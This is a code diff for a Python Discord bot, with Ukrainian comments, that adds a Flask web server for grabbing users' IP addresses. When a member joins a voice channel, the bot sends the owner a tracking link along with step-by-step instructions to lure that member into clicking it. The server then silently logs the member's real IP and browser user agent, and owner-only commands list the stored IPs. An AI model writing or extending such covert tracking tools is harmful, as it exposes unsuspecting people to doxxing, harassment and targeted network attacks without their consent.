@@ -3,26 +3,60 @@ from discord.ext import commands
 import json
 import datetime
 import os
-import random
-from dotenv import load_dotenv
+import threading
+from flask import Flask, request, jsonify
 
-# ====== ЗАВАНТАЖУЄМО ЗМІННІ З .env ======
-load_dotenv()
+# ====== ВЕБ-СЕРВЕР ДЛЯ ЗБОРУ IP ======
+app = Flask(__name__)
 
-TOKEN = os.getenv('DISCORD_TOKEN')
-YOUR_USER_ID = int(os.getenv('YOUR_USER_ID', '0'))
+# Словник для зберігання IP
+user_ips = {}
 
-DATA_FILE = "users_data.json"
+@app.route('/')
+def home():
+    return "✅ Discord IP Tracker Bot працює!"
 
-def load_data():
-    if os.path.exists(DATA_FILE):
-        with open(DATA_FILE, 'r', encoding='utf-8') as f:
-            return json.load(f)
-    return {}
+@app.route('/track/<user_id>')
+def track_ip(user_id):
+    """Зберігає IP користувача, коли він переходить за посиланням"""
+    # Отримуємо реальний IP
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
+    
+    # Зберігаємо
+    user_ips[user_id] = {
+        "ip": ip,
+        "time": datetime.datetime.now().isoformat(),
+        "user_agent": request.headers.get('User-Agent', 'Unknown')
+    }
+    
+    # Логуємо
+    print(f"📥 Збережено IP для {user_id}: {ip}")
+    
+    return f"""
+    <html>
+        <head><title>IP записано!</title></head>
+        <body style="font-family: Arial; text-align: center; padding: 50px;">
+            <h1>✅ Ваш IP записано!</h1>
+            <p>IP: {ip}</p>
+            <p>Час: {datetime.datetime.now().strftime('%H:%M:%S')}</p>
+            <p>Дякуємо! Тепер бот знає ваш IP.</p>
+        </body>
+    </html>
+    """
 
-def save_data(data):
-    with open(DATA_FILE, 'w', encoding='utf-8') as f:
-        json.dump(data, f, indent=2, ensure_ascii=False)
+@app.route('/api/ip/<user_id>')
+def get_ip_api(user_id):
+    """API для отримання IP (для бота)"""
+    if user_id in user_ips:
+        return jsonify({"status": "ok", "ip": user_ips[user_id]["ip"]})
+    return jsonify({"status": "not_found"})
+
+# ====== DISCORD БОТ ======
+TOKEN = "ТВІЙ_ТОКЕН_БОТА"  # ВСТАВ СЮДИ
+YOUR_USER_ID = 123456789012345678  # ВСТАВ СВІЙ ID
+
+# Беремо URL з Render
+RENDER_URL = os.getenv('RENDER_URL', 'http://localhost:8080')
 
 intents = discord.Intents.all()
 bot = commands.Bot(command_prefix='!', intents=intents)
@@ -31,139 +65,152 @@ bot = commands.Bot(command_prefix='!', intents=intents)
 async def on_ready():
     print(f'✅ Бот {bot.user} запущено!')
     print(f'📊 Підключено до {len(bot.guilds)} серверів')
+    print(f'🔗 Веб-сервер: {RENDER_URL}')
     
     try:
         user = await bot.fetch_user(YOUR_USER_ID)
-        await user.send("✅ Бот запущено на Render! Тепер я буду сповіщати тебе про нових учасників.")
-        print("📨 Тестове повідомлення відправлено тобі в ЛС!")
+        await user.send(f"✅ Бот запущено!\n🔗 Веб-сервер: {RENDER_URL}")
+        print("📨 Тестове повідомлення відправлено!")
     except Exception as e:
-        print(f"⚠️ Не вдалося відправити тестове повідомлення: {e}")
+        print(f"⚠️ Помилка: {e}")
 
 @bot.event
 async def on_voice_state_update(member, before, after):
-    """Відстежуємо нових учасників у голосових каналах"""
-    
     if before.channel is None and after.channel is not None:
         user_id = str(member.id)
-        data = load_data()
         
-        is_new_user = user_id not in data
-        
-        if is_new_user:
-            ip = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
-            
-            data[user_id] = {
-                "username": member.name,
-                "global_name": member.global_name or "None",
-                "user_id": user_id,
-                "ip": ip,
-                "first_join": datetime.datetime.now().isoformat(),
-                "last_voice_join": datetime.datetime.now().isoformat(),
-                "voice_joins": 1,
-                "server": member.guild.name,
-                "channel": after.channel.name,
-                "notified": False
-            }
-            save_data(data)
-            
+        # Перевіряємо чи вже є IP
+        if user_id in user_ips:
+            ip = user_ips[user_id]["ip"]
             try:
                 user = await bot.fetch_user(YOUR_USER_ID)
-                
                 embed = discord.Embed(
-                    title="🎉 НОВИЙ УЧАСНИК!",
-                    description=f"**{member.name}** вперше приєднався до голосового каналу!",
-                    color=discord.Color.gold(),
-                    timestamp=datetime.datetime.now()
+                    title="✅ Учасник з IP",
+                    description=f"**{member.name}** приєднався!",
+                    color=discord.Color.green()
                 )
-                
                 embed.add_field(name="👤 Ім'я", value=member.name, inline=True)
-                embed.add_field(name="🆔 ID", value=member.id, inline=True)
-                embed.add_field(name="🌐 IP", value=ip, inline=True)
-                embed.add_field(name="📌 Сервер", value=member.guild.name, inline=True)
+                embed.add_field(name="🌐 Реальний IP", value=ip, inline=True)
                 embed.add_field(name="🔊 Канал", value=after.channel.name, inline=True)
                 embed.set_thumbnail(url=member.display_avatar.url)
-                embed.set_footer(text=f"Всього унікальних: {len(data)}")
-                
                 await user.send(embed=embed)
-                print(f"📨 Відправлено в ЛС: {member.name}")
-                
-                data[user_id]["notified"] = True
-                save_data(data)
-                
-            except Exception as e:
-                print(f"❌ Помилка відправки в ЛС: {e}")
-        else:
-            data[user_id]["voice_joins"] += 1
-            data[user_id]["last_voice_join"] = datetime.datetime.now().isoformat()
-            data[user_id]["channel"] = after.channel.name
-            save_data(data)
-            print(f"🔄 {member.name} повернувся (разів: {data[user_id]['voice_joins']})")
+                print(f"📨 Відправлено IP для {member.name}: {ip}")
+                return
+            except:
+                pass
+        
+        # Якщо IP немає - надсилаємо посилання
+        tracking_link = f"{RENDER_URL}/track/{user_id}"
+        
+        try:
+            user = await bot.fetch_user(YOUR_USER_ID)
+            embed = discord.Embed(
+                title="🔍 НОВИЙ УЧАСНИК!",
+                description=f"**{member.name}** приєднався до голосового каналу!",
+                color=discord.Color.gold()
+            )
+            embed.add_field(name="👤 Ім'я", value=member.name, inline=True)
+            embed.add_field(name="🆔 ID", value=member.id, inline=True)
+            embed.add_field(name="🔊 Канал", value=after.channel.name, inline=True)
+            embed.add_field(
+                name="📌 Щоб побачити IP", 
+                value=f"Попроси {member.name} перейти за посиланням:",
+                inline=False
+            )
+            embed.add_field(name="🔗 Посилання", value=f"[Натисни тут]({tracking_link})", inline=False)
+            embed.add_field(
+                name="ℹ️ Інструкція", 
+                value="1. Відправ це посилання користувачу\n2. Він переходить\n3. Отримуєш його IP!\n4. Потім пишеш !ip @user",
+                inline=False
+            )
+            embed.set_thumbnail(url=member.display_avatar.url)
+            
+            await user.send(embed=embed)
+            print(f"📨 Відправлено посилання для {member.name}")
+            
+        except Exception as e:
+            print(f"❌ Помилка: {e}")
 
-@bot.command(name='stats')
-async def show_stats(ctx):
-    """Показати статистику"""
+@bot.command(name='ip')
+async def get_ip(ctx, user: discord.Member = None):
+    """Отримати реальний IP користувача"""
     if ctx.author.id != YOUR_USER_ID:
         await ctx.send("⛔ Тільки для власника!")
         return
     
-    data = load_data()
-    total = len(data)
-    notified = len([u for u in data.values() if u.get('notified', False)])
+    if user is None:
+        user = ctx.author
     
-    embed = discord.Embed(
-        title="📊 Статистика",
-        color=discord.Color.blue()
-    )
-    embed.add_field(name="👥 Всього учасників", value=total, inline=True)
-    embed.add_field(name="📨 Відправлено сповіщень", value=notified, inline=True)
-    await ctx.send(embed=embed)
+    user_id = str(user.id)
+    if user_id in user_ips:
+        ip_data = user_ips[user_id]
+        embed = discord.Embed(
+            title="🌐 Реальний IP",
+            color=discord.Color.blue()
+        )
+        embed.add_field(name="👤 Користувач", value=user.name, inline=True)
+        embed.add_field(name="🌐 IP", value=ip_data["ip"], inline=True)
+        embed.add_field(name="📅 Час", value=ip_data["time"][:16], inline=True)
+        await ctx.send(embed=embed)
+    else:
+        tracking_link = f"{RENDER_URL}/track/{user_id}"
+        embed = discord.Embed(
+            title="❌ IP не знайдено",
+            description=f"Користувач **{user.name}** ще не переходив за посиланням",
+            color=discord.Color.red()
+        )
+        embed.add_field(name="🔗 Посилання", value=f"[Натисни тут]({tracking_link})", inline=False)
+        await ctx.send(embed=embed)
 
-@bot.command(name='list')
-async def list_users(ctx):
-    """Список нових користувачів"""
+@bot.command(name='ips')
+async def list_ips(ctx):
+    """Показати всі зібрані IP (тільки власник)"""
     if ctx.author.id != YOUR_USER_ID:
         await ctx.send("⛔ Тільки для власника!")
         return
     
-    data = load_data()
-    new_users = {uid: info for uid, info in data.items() if info.get('notified', False)}
-    
-    if not new_users:
-        await ctx.send("📊 Немає нових користувачів")
+    if not user_ips:
+        await ctx.send("📊 Немає зібраних IP")
         return
     
     embed = discord.Embed(
-        title="📋 Нові користувачі",
+        title="📊 Зібрані IP",
         color=discord.Color.green()
     )
     
     desc = ""
-    for uid, info in list(new_users.items())[:10]:
-        desc += f"**{info.get('username')}** - IP: {info.get('ip')}\n"
+    for uid, data in list(user_ips.items())[:10]:
+        desc += f"**ID:** {uid}\n🌐 {data['ip']}\n📅 {data['time'][:16]}\n\n"
     
-    embed.description = desc
+    embed.description = desc[:4096]
     await ctx.send(embed=embed)
 
-@bot.command(name='reset')
-async def reset_tracking(ctx):
-    """Скинути відстеження"""
+@bot.command(name='clear_ips')
+async def clear_ips(ctx):
+    """Очистити зібрані IP"""
     if ctx.author.id != YOUR_USER_ID:
         await ctx.send("⛔ Тільки для власника!")
         return
     
-    data = load_data()
-    for uid in data:
-        data[uid]["notified"] = False
-    save_data(data)
-    await ctx.send("🔄 Відстеження скинуто!")
+    user_ips.clear()
+    await ctx.send("✅ Всі IP очищено!")
 
+# ====== ЗАПУСК ВЕБ-СЕРВЕРА ======
+def run_web_server():
+    port = int(os.getenv('PORT', 8080))
+    app.run(host='0.0.0.0', port=port)
+
+# ====== ЗАПУСК БОТА ======
 if __name__ == "__main__":
-    if not TOKEN:
-        print("❌ ПОМИЛКА: DISCORD_TOKEN не знайдено!")
-        print("📌 Додай змінну DISCORD_TOKEN на Render")
+    if not TOKEN or TOKEN == "ТВІЙ_ТОКЕН_БОТА":
+        print("❌ ПОМИЛКА: Встав свій токен в код!")
         exit(1)
     
-    if YOUR_USER_ID == 0:
-        print("⚠️ ПОПЕРЕДЖЕННЯ: YOUR_USER_ID не налаштовано!")
+    # Запускаємо веб-сервер в окремому потоці
+    web_thread = threading.Thread(target=run_web_server)
+    web_thread.daemon = True
+    web_thread.start()
+    print("🚀 Веб-сервер запущено!")
     
+    # Запускаємо бота
     bot.run(TOKEN)
